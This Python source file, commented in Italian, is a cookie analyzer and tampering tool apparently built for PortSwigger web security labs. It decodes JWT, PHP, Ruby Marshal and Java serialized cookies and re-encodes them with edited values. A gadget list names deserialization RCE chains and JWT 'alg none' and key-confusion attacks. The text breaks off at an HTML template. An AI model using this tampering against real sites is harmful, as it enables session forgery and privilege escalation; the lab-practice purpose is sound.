#!/usr/bin/env python3
"""
PortSwigger Cookie Analyzer & Tampering Tool
Versione: 2.0 - GUI Tkinter + Web UI su 127.0.0.1:8990
Autore: fazelucq
USO: python tool.py
"""

import tkinter as tk
from tkinter import ttk, messagebox, scrolledtext, filedialog
import base64
import json
import re
import threading
import urllib.parse
import urllib.request
import urllib.error
import http.server
import socketserver
import datetime
import binascii
import hashlib
import hmac
import struct
import os
import sys
import copy

# ─── COSTANTI GLOBALI ─────────────────────────────────────────────────────────
APP_TITLE   = "PortSwigger Cookie Analyzer v2.0"
WEB_PORT    = 8990
PROXY_HOST  = "127.0.0.1"
PROXY_PORT  = 8080
LOG_BUFFER  = []          # log globale condiviso
CURRENT_STATE = {         # stato condiviso GUI ↔ WebUI
    "raw_cookie":    "",
    "detected_lang": "Unknown",
    "decoded_data":  {},
    "params":        [],
    "log":           [],
}

# ─── DETECTION ENGINE ──────────────────────────────────────────────────────────

def safe_b64decode(data: str) -> bytes | None:
    """Tenta base64 standard e url-safe, gestisce padding."""
    data = data.strip()
    for variant in (data, data.replace("-", "+").replace("_", "/")):
        for pad in ("", "=", "==", "==="):
            try:
                return base64.b64decode(variant + pad)
            except Exception:
                continue
    return None


def detect_language(cookie_value: str) -> dict:
    """
    Rileva il linguaggio/formato del cookie.
    Ritorna dict con: lang, confidence, raw_bytes, preview, error
    """
    result = {
        "lang": "Unknown",
        "confidence": 0,
        "raw_bytes": b"",
        "preview": "",
        "method": "",
        "error": None,
    }

    if not cookie_value or not cookie_value.strip():
        result["error"] = "Cookie vuoto o non fornito."
        return result

    # Estrai il valore dopo "name="
    val = cookie_value.strip()
    if "=" in val and not val.startswith("eyJ") and not val.startswith("{"):
        parts = val.split("=", 1)
        if len(parts) == 2:
            val = parts[1].strip()

    if not val:
        result["error"] = "Valore del cookie vuoto dopo il nome."
        return result

    # ── JWT (eyJ...) ─────────────────────────────────────────────────────────
    if (val.startswith("eyJ") and "." in val) or re.match(r"^eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.?[A-Za-z0-9_\-]*$", val):
        result["lang"]       = "JWT"
        result["confidence"] = 99
        result["method"]     = "base64url header detection (eyJ prefix)"
        try:
            parts = val.split(".")
            if len(parts) < 2:
                raise ValueError("JWT non ha almeno 2 parti (header.payload)")
            header_dec  = safe_b64decode(parts[0])
            payload_dec = safe_b64decode(parts[1])
            if header_dec is None or payload_dec is None:
                raise ValueError("Impossibile decodificare header/payload JWT")
            header_json  = json.loads(header_dec.decode("utf-8", errors="replace"))
            payload_json = json.loads(payload_dec.decode("utf-8", errors="replace"))
            result["raw_bytes"] = val.encode()
            result["preview"]   = json.dumps(
                {"header": header_json, "payload": payload_json, "signature": parts[2] if len(parts) > 2 else ""},
                indent=2
            )
        except Exception as e:
            result["error"] = f"JWT decode parziale: {e}"
        return result

    # Prova URL-decode prima
    try:
        url_decoded = urllib.parse.unquote(val)
    except Exception:
        url_decoded = val

    # ── PHP Serialized ────────────────────────────────────────────────────────
    php_pattern = re.compile(r'^(O:\d+:|a:\d+:|s:\d+:|i:\d+|b:[01];|N;)', re.IGNORECASE)
    for candidate in (url_decoded, val):
        if php_pattern.match(candidate):
            result["lang"]       = "PHP Serialized"
            result["confidence"] = 97
            result["method"]     = "Pattern match PHP serialize prefix"
            result["raw_bytes"]  = candidate.encode()
            result["preview"]    = _parse_php_serialize(candidate)
            return result

    # ── Tenta base64 decode per formati binari ────────────────────────────────
    raw = safe_b64decode(url_decoded) or safe_b64decode(val)

    if raw is not None:
        result["raw_bytes"] = raw

        # ── Ruby Marshal [04 08] ─────────────────────────────────────────────
        if len(raw) >= 2 and raw[0] == 0x04 and raw[1] == 0x08:
            result["lang"]       = "Ruby Marshal"
            result["confidence"] = 99
            result["method"]     = "Magic bytes 0x04 0x08 (Ruby Marshal 4.8)"
            result["preview"]    = _parse_ruby_marshal(raw)
            return result

        # BAYK prefix (base64 di 04 08)
        if val.startswith("BAYK") or val.startswith("BAh"):
            result["lang"]       = "Ruby Marshal"
            result["confidence"] = 95
            result["method"]     = "Base64 prefix BAYK/BAh → Ruby Marshal"
            result["preview"]    = _parse_ruby_marshal(raw)
            return result

        # ── Java Serialized [AC ED] ───────────────────────────────────────────
        if len(raw) >= 2 and raw[0] == 0xAC and raw[1] == 0xED:
            result["lang"]       = "Java Serialized"
            result["confidence"] = 99
            result["method"]     = "Magic bytes 0xAC 0xED (Java ObjectStream)"
            result["preview"]    = _parse_java_serial(raw)
            return result

        # ── JSON dentro base64 ────────────────────────────────────────────────
        try:
            decoded_str = raw.decode("utf-8")
            parsed_json = json.loads(decoded_str)
            result["lang"]       = "JSON (base64-encoded)"
            result["confidence"] = 95
            result["method"]     = "base64 → valid JSON"
            result["preview"]    = json.dumps(parsed_json, indent=2, ensure_ascii=False)
            return result
        except Exception:
            pass

        # ── PHP dentro base64 ─────────────────────────────────────────────────
        try:
            decoded_str = raw.decode("utf-8", errors="replace")
            if php_pattern.match(decoded_str):
                result["lang"]       = "PHP Serialized (base64-encoded)"
                result["confidence"] = 95
                result["method"]     = "base64 → PHP serialize pattern"
                result["raw_bytes"]  = raw
                result["preview"]    = _parse_php_serialize(decoded_str)
                return result
        except Exception:
            pass

        # ── Hex preview generico ───────────────────────────────────────────────
        hex_str = raw.hex().upper()
        result["lang"]       = "Binary/Unknown"
        result["confidence"] = 30
        result["method"]     = "base64 decodificato, formato non riconosciuto"
        result["preview"]    = f"HEX: {hex_str[:256]}{'...' if len(hex_str) > 256 else ''}\nASCII: {raw.decode('ascii', errors='replace')[:128]}"
        return result

    # ── JSON diretto ──────────────────────────────────────────────────────────
    try:
        parsed_json = json.loads(url_decoded)
        result["lang"]       = "JSON"
        result["confidence"] = 98
        result["method"]     = "Direct JSON parse"
        result["preview"]    = json.dumps(parsed_json, indent=2, ensure_ascii=False)
        return result
    except Exception:
        pass

    # ── Formato chiave=valore (es. Flask/Django session-like) ─────────────────
    if re.search(r'[a-zA-Z0-9_]+=[^&]+(&[a-zA-Z0-9_]+=[^&]+)*', url_decoded):
        result["lang"]       = "Key=Value / URL-encoded"
        result["confidence"] = 70
        result["method"]     = "key=value pattern match"
        result["preview"]    = "\n".join(
            f"  {k} = {v}" for k, v in urllib.parse.parse_qsl(url_decoded, keep_blank_values=True)
        )
        return result

    result["error"] = "Formato non riconosciuto. Controlla il cookie."
    result["preview"] = f"Raw: {val[:200]}"
    return result


# ─── PARSER SPECIFICI PER LINGUAGGIO ──────────────────────────────────────────

def _parse_ruby_marshal(data: bytes) -> str:
    """Parser Ruby Marshal - estrae oggetti e campi editabili."""
    lines = [f"💎 Ruby Marshal Object (size: {len(data)} bytes)"]
    if len(data) < 2:
        return "\n".join(lines + ["Dati troppo corti."])
    lines.append(f"Magic: {data[:2].hex().upper()} (Marshal v{data[0]}.{data[1]})")

    type_map = {
        "o": "Object instance", "h": "Hash", "[": "Array",
        '"': "String", "i": "Integer", "T": "True", "F": "False",
        "0": "Nil", "u": "UserDefined", "I": "IVAR",
        "l": "Bignum", "f": "Float", ":": "Symbol", ";": "Sym-ref", "@": "Obj-ref",
    }

    if len(data) > 2:
        obj_type = chr(data[2]) if 32 <= data[2] < 127 else f"\\x{data[2]:02x}"
        lines.append(f"Root type: '{obj_type}' → {type_map.get(obj_type, 'Unknown')}")

    # Estrai coppie (symbol, value) tramite parser semplificato
    fields = _ruby_extract_fields(data)
    lines.append("")
    lines.append("═══ PARAMETRI ESTRATTI ═══")
    if fields:
        for f in fields:
            lines.append(f"  {f['key']} = {f['value']!r}")
    else:
        # Fallback: mostra stringhe embedded
        strings_found = re.findall(b'[\x20-\x7e]{3,}', data[3:])
        if strings_found:
            lines.append("  Stringhe embedded:")
            for s in strings_found[:20]:
                lines.append(f"    • {s.decode('ascii', errors='replace')}")
        else:
            lines.append("  (nessun parametro estratto)")

    lines.append(f"\nHEX dump (first 64 bytes):\n{data[:64].hex(' ').upper()}")
    return "\n".join(lines)


def _ruby_extract_fields(data: bytes) -> list:
    """Estrae coppie chiave-valore da un Ruby Marshal Hash/Object."""
    fields = []
    try:
        pos = [2]  # skip magic

        def read_byte():
            b = data[pos[0]]
            pos[0] += 1
            return b

        def read_int():
            """Ruby Marshal integer encoding."""
            b = read_byte()
            if b == 0: return 0
            if b > 4:  return b - 5
            if b < 252: return -(256 - b) + 1  # negative small
            if b == 1:
                return read_byte()
            if b == 2:
                lo = read_byte(); hi = read_byte()
                return lo | (hi << 8)
            if b == 3:
                a = read_byte(); b2 = read_byte(); c = read_byte()
                return a | (b2 << 8) | (c << 16)
            if b == 4:
                a = read_byte(); b2 = read_byte(); c = read_byte(); d = read_byte()
                return a | (b2 << 8) | (c << 16) | (d << 24)
            if b == 255: return read_byte() - 256
            if b == 254:
                lo = read_byte(); hi = read_byte()
                return (lo | (hi << 8)) - 65536
            return 0

        def read_string_raw():
            length = read_int()
            s = data[pos[0]:pos[0]+length].decode("utf-8", errors="replace")
            pos[0] += length
            return s

        def read_value(depth=0):
            if pos[0] >= len(data) or depth > 20:
                return None
            t = read_byte()
            if t == ord('0'): return None           # nil
            if t == ord('T'): return True           # true
            if t == ord('F'): return False          # false
            if t == ord('i'):                       # integer
                return read_int()
            if t == ord('"'):                       # string
                return read_string_raw()
            if t == ord('f'):                       # float
                s = read_string_raw(); 
                try: return float(s)
                except: return s
            if t == ord(':'):                       # symbol
                return ":" + read_string_raw()
            if t == ord(';'):                       # symbol ref
                idx = read_int(); return f":sym_{idx}"
            if t == ord('@'):                       # obj ref
                idx = read_int(); return f"@ref_{idx}"
            if t == ord('I'):                       # IVAR
                val = read_value(depth+1)
                count = read_int()
                for _ in range(count):
                    read_value(depth+1)  # key
                    read_value(depth+1)  # val (encoding etc.)
                return val
            if t == ord('{'):                       # hash
                count = read_int()
                result = {}
                for _ in range(count):
                    k = read_value(depth+1)
                    v = read_value(depth+1)
                    if k is not None:
                        result[str(k)] = v
                return result
            if t == ord('['):                       # array
                count = read_int()
                return [read_value(depth+1) for _ in range(count)]
            if t == ord('o'):                       # object
                cls = read_value(depth+1)
                count = read_int()
                result = {"__class__": str(cls)}
                for _ in range(count):
                    k = read_value(depth+1)
                    v = read_value(depth+1)
                    if k is not None:
                        result[str(k)] = v
                return result
            if t == ord('u'):                       # user defined
                cls = read_value(depth+1)
                length = read_int()
                raw_data = data[pos[0]:pos[0]+length]
                pos[0] += length
                return {"__class__": str(cls), "__data__": raw_data.hex()}
            if t == ord('l'):                       # bignum
                sign = chr(read_byte())
                count = read_int()
                val = 0
                for i in range(count):
                    val |= read_byte() << (8*i)
                    if i+1 < count: val |= read_byte() << (8*i+8)
                return -val if sign == '-' else val
            # Unknown type - stop
            return None

        root = read_value()
        if isinstance(root, dict):
            for k, v in root.items():
                if k == "__class__":
                    continue
                key_str = k.lstrip(":")
                fields.append({"key": key_str, "value": str(v) if not isinstance(v, str) else v})
        elif isinstance(root, str):
            fields.append({"key": "value", "value": root})
    except Exception as e:
        pass  # Parser best-effort, non crasha
    return fields


def _parse_php_serialize(data: str) -> str:
    """Parser PHP serialize leggibile."""
    lines = ["PHP Serialized Object"]
    try:
        parsed = _php_unserialize_simple(data)
        lines.append(json.dumps(parsed, indent=2, default=str, ensure_ascii=False))
    except Exception as e:
        lines.append(f"Parse semplificato non disponibile: {e}")
        lines.append(f"Raw: {data[:500]}")
    return "\n".join(lines)


def _php_unserialize_simple(data: str) -> object:
    """Unserializer PHP minimale per visualizzazione (NO eval)."""
    pos = [0]

    def read_until(char):
        start = pos[0]
        idx = data.index(char, pos[0])
        pos[0] = idx + 1
        return data[start:idx]

    def parse_value():
        if pos[0] >= len(data):
            return None
        t = data[pos[0]]
        pos[0] += 1

        if t == 'N':
            pos[0] += 1  # ;
            return None
        elif t == 'b':
            pos[0] += 1  # :
            val = data[pos[0]]
            pos[0] += 2  # val + ;
            return val == "1"
        elif t == 'i':
            pos[0] += 1  # :
            val = read_until(";")
            return int(val)
        elif t == 'd':
            pos[0] += 1
            val = read_until(";")
            return float(val)
        elif t == 's':
            pos[0] += 1  # :
            length = int(read_until(":"))
            pos[0] += 1  # "
            val = data[pos[0]:pos[0]+length]
            pos[0] += length + 2  # ";
            return val
        elif t == 'a':
            pos[0] += 1
            count = int(read_until(":"))
            pos[0] += 1  # {
            result = {}
            for _ in range(count):
                k = parse_value()
                v = parse_value()
                result[str(k)] = v
            pos[0] += 1  # }
            return result
        elif t == 'O':
            pos[0] += 1
            name_len = int(read_until(":"))
            pos[0] += 1  # "
            class_name = data[pos[0]:pos[0]+name_len]
            pos[0] += name_len + 2  # ":
            prop_count = int(read_until(":"))
            pos[0] += 1  # {
            props = {}
            for _ in range(prop_count):
                k = parse_value()
                v = parse_value()
                props[str(k)] = v
            pos[0] += 1  # }
            return {"__class__": class_name, "__props__": props}
        else:
            return f"<unknown type {t!r}>"

    return parse_value()


def _parse_java_serial(data: bytes) -> str:
    """Parser Java Serialized Object - estrae classe, campi e valori."""
    lines = ["☕ Java Serialized Object"]
    if len(data) < 4:
        lines.append("Dati troppo corti per essere un oggetto Java valido.")
        return "\n".join(lines)
    version = struct.unpack(">H", data[2:4])[0]
    lines.append(f"Magic: 0xACED | Stream version: {version}")

    # Estrai nome classe (TC_CLASSDESC: 0x72 seguito da len+name)
    class_name = _java_extract_classname(data)
    if class_name:
        lines.append(f"Classe: {class_name}")

    # Estrai nomi campi dichiarati
    field_names = _java_extract_field_names(data)
    if field_names:
        lines.append(f"Campi dichiarati: {', '.join(field_names)}")

    # Estrai valori stringa dopo marker 'xp' (0x78 0x70)
    field_values = _java_extract_field_values(data)

    lines.append("")
    lines.append("═══ PARAMETRI ESTRATTI ═══")
    if field_names and field_values:
        for name, fv in zip(field_names, field_values):
            lines.append(f"  {name} = {fv['value']!r}")
        # Se ci sono più valori che nomi, mostrali come extra
        for fv in field_values[len(field_names):]:
            lines.append(f"  [extra] = {fv['value']!r}")
    elif field_values:
        for i, fv in enumerate(field_values):
            lines.append(f"  field_{i} = {fv['value']!r}")
    else:
        lines.append("  (nessun campo stringa trovato)")

    lines.append("")
    lines.append(f"Dimensione totale: {len(data)} bytes")
    lines.append(f"HEX (first 64 bytes): {data[:64].hex(' ').upper()}")
    return "\n".join(lines)


def _java_extract_classname(data: bytes) -> str:
    """Estrae il nome della classe dal TC_CLASSDESC."""
    try:
        # TC_CLASSDESC = 0x72, poi 2-byte length, poi class name
        i = 0
        while i < len(data) - 3:
            if data[i] == 0x72:  # TC_CLASSDESC
                length = struct.unpack(">H", data[i+1:i+3])[0]
                if 0 < length < 256:
                    candidate = data[i+3:i+3+length]
                    try:
                        name = candidate.decode("utf-8")
                        if "." in name or name[0].isupper():
                            return name
                    except Exception:
                        pass
            i += 1
    except Exception:
        pass
    return ""


def _java_extract_field_names(data: bytes) -> list:
    """Estrae i nomi dei campi dalla descrizione della classe."""
    names = []
    try:
        # Dopo TC_CLASSDESC: 8-byte serialUID, flags, field count (2 bytes)
        # Ogni campo: type (1 byte) + name (2-byte len + chars) + ...
        # Strategia: trova sequenze UTF-8 di 2-32 char che sembrano field names
        # Le field names sono PRIMA di "Ljava/lang/" descriptors
        i = 0
        while i < len(data) - 3:
            if data[i] == 0x4C:  # 'L' = object field type marker in classdesc
                # Prima del 'L' c'è il nome del campo: cerca indietro
                pass
            # TC field: type char (1) + 2-byte name len + name chars
            # type chars: B C D F I J L S Z [
            if data[i] in (ord('B'),ord('C'),ord('D'),ord('F'),ord('I'),ord('J'),ord('L'),ord('S'),ord('Z'),ord('[')):
                name_len = struct.unpack(">H", data[i+1:i+3])[0]
                if 1 < name_len < 64:
                    candidate = data[i+3:i+3+name_len]
                    try:
                        name = candidate.decode("utf-8")
                        # Field names: solo lettere, cifre, underscore; iniziano con minuscola
                        if re.match(r'^[a-zA-Z_$][a-zA-Z0-9_$]*$', name) and name not in names:
                            # Verifica che non sia un class descriptor
                            if not name.startswith("java") and "/" not in name:
                                names.append(name)
                    except Exception:
                        pass
            i += 1
        # Filtra nomi che sono chiaramente class descriptors
        names = [n for n in names if len(n) > 1 and not n.startswith("L")]
    except Exception:
        pass
    return names[:20]  # max 20 nomi


def _java_extract_field_values(data: bytes) -> list:
    """Estrae i valori stringa (TC_STRING = 0x74) dall'oggetto serializzato."""
    values = []
    try:
        # Trova il marker 'xp' (0x78 0x70 = TC_ENDBLOCKDATA + TC_NULL) 
        # I valori dei campi vengono DOPO questo marker
        xp_pos = -1
        for i in range(len(data) - 1):
            if data[i] == 0x78 and data[i+1] == 0x70:
                xp_pos = i
                break

        start = xp_pos + 2 if xp_pos >= 0 else 0
        i = start
        while i < len(data) - 2:
            if data[i] == 0x74:  # TC_STRING
                length = struct.unpack(">H", data[i+1:i+3])[0]
                if 0 < length < 512:
                    val_bytes = data[i+3:i+3+length]
                    try:
                        val_str = val_bytes.decode("utf-8")
                        values.append({
                            "offset": i,
                            "length": length,
                            "value": val_str,
                        })
                        i += 3 + length
                        continue
                    except Exception:
                        pass
            i += 1
    except Exception:
        pass
    return values


# ─── RE-ENCODER ───────────────────────────────────────────────────────────────

def reencode_cookie(original_cookie: str, params: list, detected_lang: str) -> dict:
    """
    Ricodifica il cookie con i parametri modificati.
    Ritorna dict con: success, new_value, error
    """
    val = original_cookie.strip()
    cookie_name = ""
    if "=" in val:
        parts = val.split("=", 1)
        cookie_name = parts[0] + "="
        val = parts[1]

    try:
        if detected_lang == "JWT":
            return _reencode_jwt(val, params, cookie_name)
        elif detected_lang in ("JSON", "JSON (base64-encoded)"):
            return _reencode_json(val, params, cookie_name, b64=("base64" in detected_lang.lower()))
        elif detected_lang in ("PHP Serialized", "PHP Serialized (base64-encoded)"):
            return _reencode_php(val, params, cookie_name, b64=("base64" in detected_lang.lower()))
        elif detected_lang == "Key=Value / URL-encoded":
            return _reencode_kv(val, params, cookie_name)
        elif detected_lang == "Java Serialized":
            return _reencode_java(val, params, cookie_name)
        elif detected_lang == "Ruby Marshal":
            return _reencode_ruby(val, params, cookie_name)
        elif detected_lang == "Binary/Unknown":
            return {
                "success": False,
                "new_value": "",
                "error": "Formato binario sconosciuto: impossibile re-encodare automaticamente.",
            }
        else:
            return {"success": False, "new_value": "", "error": f"Linguaggio non supportato: {detected_lang}"}
    except Exception as e:
        return {"success": False, "new_value": "", "error": f"Errore durante re-encoding: {e}"}


def _reencode_jwt(val: str, params: list, prefix: str) -> dict:
    """Ricrea JWT con payload modificato (signature invalidata - per lab purposes)."""
    parts = val.split(".")
    if len(parts) < 2:
        return {"success": False, "new_value": "", "error": "JWT malformato"}
    payload_dec = safe_b64decode(parts[1])
    if payload_dec is None:
        return {"success": False, "new_value": "", "error": "Impossibile decodificare payload JWT"}
    payload = json.loads(payload_dec.decode("utf-8"))
    for p in params:
        key, val_p = p.get("key", ""), p.get("value", "")
        if key:
            # Tenta conversione tipo
            try:
                payload[key] = json.loads(val_p)
            except Exception:
                payload[key] = val_p
    new_payload = base64.urlsafe_b64encode(
        json.dumps(payload, separators=(",", ":")).encode()
    ).rstrip(b"=").decode()
    # Signature invalida (none attack o originale)
    header_b64 = parts[0]
    sig = parts[2] if len(parts) > 2 else ""
    new_jwt = f"{header_b64}.{new_payload}.{sig}"
    return {"success": True, "new_value": prefix + new_jwt, "error": None}


def _reencode_json(val: str, params: list, prefix: str, b64: bool) -> dict:
    if b64:
        raw = safe_b64decode(val)
        if raw is None:
            return {"success": False, "new_value": "", "error": "base64 decode fallita"}
        obj = json.loads(raw.decode("utf-8"))
    else:
        obj = json.loads(val)
    for p in params:
        key, val_p = p.get("key", ""), p.get("value", "")
        if key:
            try:
                obj[key] = json.loads(val_p)
            except Exception:
                obj[key] = val_p
    new_str = json.dumps(obj, separators=(",", ":"))
    if b64:
        new_val = base64.b64encode(new_str.encode()).decode()
    else:
        new_val = new_str
    return {"success": True, "new_value": prefix + new_val, "error": None}


def _reencode_php(val: str, params: list, prefix: str, b64: bool) -> dict:
    """Per PHP modifica raw string (cerca e sostituisce valori)."""
    try:
        url_dec = urllib.parse.unquote(val)
    except Exception:
        url_dec = val
    if b64:
        raw = safe_b64decode(url_dec) or safe_b64decode(val)
        if raw is None:
            return {"success": False, "new_value": "", "error": "base64 decode fallita per PHP"}
        php_str = raw.decode("utf-8", errors="replace")
    else:
        php_str = url_dec

    for p in params:
        key, val_p = p.get("key", ""), p.get("value", "")
        if not key:
            continue
        key_len = len(key)
        # Cerca pattern s:key_len:"key";s:...: oppure s:key_len:"key";b:
        pattern = re.compile(
            r'(s:' + str(key_len) + r':"' + re.escape(key) + r'";)(s:\d+:"[^"]*";|b:[01];|i:\d+;|N;|d:[^;]+;)',
            re.DOTALL
        )
        # Determina tipo nuovo valore
        # NOTA: isdigit() check PRIMA dei booleani per evitare che "0"/"1" diventino b:0/b:1
        if val_p.lstrip("-").isdigit() and val_p not in ("true", "false", "True", "False"):
            replacement = r'\g<1>i:' + val_p + r';'
        elif val_p in ("true", "True"):
            replacement = r'\g<1>b:1;'
        elif val_p in ("false", "False"):
            replacement = r'\g<1>b:0;'
        else:
            replacement = r'\g<1>s:' + str(len(val_p)) + r':"' + val_p + r'";'  
        php_str, count = pattern.subn(replacement, php_str, count=1)
        if count == 0:
            log_event(f"⚠ Chiave PHP '{key}' non trovata per sostituzione")

    if b64:
        new_val = base64.b64encode(php_str.encode("utf-8")).decode()
    else:
        new_val = php_str
    return {"success": True, "new_value": prefix + new_val, "error": None}


def _reencode_kv(val: str, params: list, prefix: str) -> dict:
    try:
        url_dec = urllib.parse.unquote(val)
    except Exception:
        url_dec = val
    kv = dict(urllib.parse.parse_qsl(url_dec, keep_blank_values=True))
    for p in params:
        key, val_p = p.get("key", ""), p.get("value", "")
        if key:
            kv[key] = val_p
    new_val = urllib.parse.urlencode(kv)
    return {"success": True, "new_value": prefix + new_val, "error": None}


def _reencode_java(val: str, params: list, prefix: str) -> dict:
    """Re-encode Java Serialized: sostituisce TC_STRING values in-place nel binario."""
    try:
        # Decodifica base64 (con URL-decode prima)
        raw = safe_b64decode(urllib.parse.unquote(val)) or safe_b64decode(val)
        if raw is None:
            return {"success": False, "new_value": "", "error": "Impossibile decodificare base64 del token Java."}

        raw_ba = bytearray(raw)

        # Ottieni i valori correnti per poterli sostituire
        current_values = _java_extract_field_values(bytes(raw_ba))
        field_names    = _java_extract_field_names(bytes(raw_ba))

        # Costruisci mappa nome→valore corrente
        name_to_fv = {}
        if field_names and current_values:
            for name, fv in zip(field_names, current_values):
                name_to_fv[name] = fv

        modified = bytes(raw_ba)
        changes = 0

        for p in params:
            param_key = p.get("key", "").strip()
            param_val = p.get("value", "")
            if not param_key:
                continue

            # Trova il valore corrente per questo param
            old_str = None
            if param_key in name_to_fv:
                old_str = name_to_fv[param_key]["value"]
            else:
                # Cerca per indice (field_0, field_1, ...) o per valore diretto
                if param_key.startswith("field_"):
                    try:
                        idx = int(param_key.split("_")[1])
                        if idx < len(current_values):
                            old_str = current_values[idx]["value"]
                    except Exception:
                        pass

            if old_str is None:
                # Tenta sostituzione per nome campo anche se non mappato
                # Cerca ogni TC_STRING e confronta col valore
                for fv in current_values:
                    if fv["value"] == param_key:
                        old_str = fv["value"]
                        break

            if old_str is not None:
                old_enc  = old_str.encode("utf-8")
                new_enc  = param_val.encode("utf-8")
                old_chunk = bytes([0x74]) + struct.pack(">H", len(old_enc)) + old_enc
                new_chunk = bytes([0x74]) + struct.pack(">H", len(new_enc)) + new_enc
                if old_chunk in modified:
                    modified = modified.replace(old_chunk, new_chunk, 1)
                    changes += 1
                    log_event(f"✅ Java field '{param_key}': '{old_str}' → '{param_val}'")
                else:
                    log_event(f"⚠ Java field '{param_key}': chunk non trovato nel binario")
            else:
                log_event(f"⚠ Java: campo '{param_key}' non trovato")

        if changes == 0:
            return {
                "success": False,
                "new_value": "",
                "error": f"Nessun campo modificato. Verifica che i nomi siano corretti.\nCampi disponibili: {list(name_to_fv.keys()) or [fv['value'][:20] for fv in current_values]}",
            }

        new_b64 = base64.b64encode(modified).decode()
        return {"success": True, "new_value": prefix + new_b64, "error": None}

    except Exception as e:
        return {"success": False, "new_value": "", "error": f"Errore re-encode Java: {e}"}


def _reencode_ruby(val: str, params: list, prefix: str) -> dict:
    """Re-encode Ruby Marshal: sostituisce stringhe in-place nel binario."""
    try:
        raw = safe_b64decode(urllib.parse.unquote(val)) or safe_b64decode(val)
        if raw is None:
            return {"success": False, "new_value": "", "error": "Impossibile decodificare base64 del token Ruby."}

        # Ottieni i campi correnti
        current_fields = _ruby_extract_fields(raw)
        field_map = {f["key"]: f["value"] for f in current_fields}

        modified = raw
        changes = 0

        for p in params:
            param_key = p.get("key", "").strip()
            param_val = p.get("value", "")
            if not param_key:
                continue

            old_val = field_map.get(param_key)
            if old_val is None:
                # Cerca anche con ":" prefix (symbol key)
                old_val = field_map.get(":" + param_key) or field_map.get(param_key.lstrip(":"))

            if old_val is not None:
                old_enc = old_val.encode("utf-8") if isinstance(old_val, str) else str(old_val).encode()
                new_enc = param_val.encode("utf-8")
                # In Ruby Marshal, strings: length byte(s) + raw bytes
                # Simple: sostituisci il pattern (old_len_byte + old_bytes)
                # Ruby encodes string length as marshal int: for len < 120, it's len+5 as single byte
                def ruby_int_bytes(n):
                    if n == 0: return bytes([0])
                    if 0 < n < 123: return bytes([n + 5])
                    if n < 256: return bytes([1, n])
                    if n < 65536: return bytes([2, n & 0xFF, (n >> 8) & 0xFF])
                    return bytes([3, n & 0xFF, (n >> 8) & 0xFF, (n >> 16) & 0xFF])

                old_chunk = bytes([0x22]) + ruby_int_bytes(len(old_enc)) + old_enc  # 0x22 = '"' string marker
                new_chunk = bytes([0x22]) + ruby_int_bytes(len(new_enc)) + new_enc

                if old_chunk in modified:
                    modified = modified.replace(old_chunk, new_chunk, 1)
                    changes += 1
                    log_event(f"✅ Ruby field '{param_key}': '{old_val}' → '{param_val}'")
                else:
                    # Fallback: cerca senza marker (per IVAR-wrapped strings)
                    if old_enc in modified:
                        # Trova la posizione e ricostruisci
                        idx = modified.find(old_enc)
                        # Sostituisci aggiornando anche il byte di lunghezza
                        modified = modified[:idx] + new_enc + modified[idx+len(old_enc):]
                        # Aggiorna il byte di lunghezza precedente
                        changes += 1
                        log_event(f"✅ Ruby field '{param_key}' (fallback): '{old_val}' → '{param_val}'")
                    else:
                        log_event(f"⚠ Ruby: campo '{param_key}' non trovato nel binario")
            else:
                log_event(f"⚠ Ruby: campo '{param_key}' non trovato. Disponibili: {list(field_map.keys())}")

        if changes == 0:
            return {
                "success": False,
                "new_value": "",
                "error": f"Nessun campo Ruby modificato.\nCampi disponibili: {list(field_map.keys())}",
            }

        new_b64 = base64.b64encode(modified).decode()
        return {"success": True, "new_value": prefix + new_b64, "error": None}

    except Exception as e:
        return {"success": False, "new_value": "", "error": f"Errore re-encode Ruby: {e}"}


# ─── GADGET SUGGESTOR ─────────────────────────────────────────────────────────

GADGET_SUGGESTIONS = {
    "Ruby Marshal": [
        {"name": "Rails ERB RCE (ysoserial)", "payload": "BAh7CEkiCGdlbQY6BkVUSSIIZXJiQDY6BkVU", "desc": "Ruby on Rails ERB template injection gadget chain (deserialization RCE)"},
        {"name": "Ruby 2.x Universal Gadget", "payload": "BAhvOiVBY3RpdmVTdXBwb3J0OjpERVBSRUNBVEVEX1dJVEhfQ0FMTEVSOgoI", "desc": "ActiveSupport deprecated callback chain"},
        {"name": "Blank Marshal Object", "payload": "BAh7AA==", "desc": "Empty Ruby Hash Marshal (safe test)"},
    ],
    "Java Serialized": [
        {"name": "CommonsCollections1", "payload": "rO0ABXNyADJzdW4ucmVmbGVjdC5hbm5vdGF0aW9uLkFubm90YXRpb25JbnZvY2F0aW9uSGFuZGxlclXK9Q8Vy36lAgACTAAMbWVtYmVyVmFsdWVzdAAPTGphdmEvdXRpbC9NYXA7TAAEdHlwZXQAEUxqYXZhL2xhbmcvQ2xhc3M7eHBzfQAAAAEADWphdmEudXRpbC5NYXA=", "desc": "Apache Commons Collections 1 gadget chain (visualizzazione)"},
        {"name": "Spring4Shell marker", "payload": "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAAAIAAAABc3IADmphdmEubGFuZy5Mb25ngCB5aVi2Y9ICAAFKAAd2YWx1ZXhyABBqYXZhLmxhbmcuTnVtYmVyhqyVHQuU4IsCAAB4cAAAAAAAAAABeA==", "desc": "Spring Framework deserialization marker"},
    ],
    "PHP Serialized": [
        {"name": "isAdmin = true", "payload": None, "desc": "Imposta isAdmin:true nel payload PHP (usa Edit Params)"},
        {"name": "role = admin", "payload": None, "desc": "Imposta role:admin nel payload (usa Edit Params)"},
        {"name": "Phar gadget marker", "payload": None, "desc": "Usa path con phar:// per file inclusion"},
    ],
    "JWT": [
        {"name": "alg: none attack", "payload": None, "desc": "Imposta header alg=none, rimuovi signature (usa Edit Params sull'header)"},
        {"name": "HS256→RS256 confusion", "payload": None, "desc": "Cambia alg da RS256 a HS256, firma con chiave pubblica"},
        {"name": "isAdmin: true", "payload": None, "desc": "Aggiungi claim isAdmin:true nel payload"},
    ],
}


# ─── LOGGER ───────────────────────────────────────────────────────────────────

def log_event(msg: str):
    ts = datetime.datetime.now().strftime("%H:%M:%S.%f")[:-3]
    entry = f"[{ts}] {msg}"
    LOG_BUFFER.append(entry)
    CURRENT_STATE["log"] = LOG_BUFFER[-200:]
    if len(LOG_BUFFER) > 500:
        LOG_BUFFER.clear()
    return entry


# ─── WEB SERVER (127.0.0.1:8990) ──────────────────────────────────────────────

WEB_HTML_TEMPLATE = """<!DOCTYPE html>
<html lang="it">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
